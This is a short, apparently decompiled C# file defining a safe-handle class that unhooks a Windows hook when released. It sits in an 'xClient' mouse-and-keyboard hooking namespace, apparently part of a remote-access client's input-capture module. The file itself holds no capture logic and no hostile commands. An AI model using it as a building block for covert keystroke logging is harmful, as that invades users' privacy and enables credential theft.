using System;
using System.Windows.Forms;
using Microsoft.Win32.SafeHandles;

namespace xClient.Core.MouseKeyHook.WinApi;

internal class HookProcedureHandle : SafeHandleZeroOrMinusOneIsInvalid
{
	private static bool _closing;

	static HookProcedureHandle()
	{
		Application.add_ApplicationExit((EventHandler)delegate
		{
			_closing = true;
		});
	}

	public HookProcedureHandle()
		: base(ownsHandle: true)
	{
	}

	protected override bool ReleaseHandle()
	{
		if (_closing)
		{
			return true;
		}
		return HookNativeMethods.UnhookWindowsHookEx(handle) != 0;
	}
}
